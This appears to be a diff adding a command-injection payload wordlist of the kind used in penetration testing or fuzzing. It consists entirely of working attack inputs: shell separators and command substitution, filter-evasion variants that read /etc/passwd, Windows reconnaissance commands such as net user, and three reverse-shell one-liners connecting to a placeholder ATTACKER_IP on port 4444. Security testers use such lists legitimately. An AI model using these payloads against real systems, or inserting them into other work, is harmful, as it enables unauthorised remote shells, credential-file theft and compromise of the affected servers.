@@ -1,0 +1,25 @@
+# Command Injection Payloads
+;
+|
+||
+&
+&&
+`id`
+$(id)
+; id
+| id
+; cat /etc/passwd
+| cat /etc/passwd
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+c'a't /etc/passwd
+c"a"t /etc/passwd
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+nc -e /bin/sh ATTACKER_IP 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+& dir
+| dir
+& type C:\\Windows\\System32\\drivers\\etc\\hosts
+| net user
+
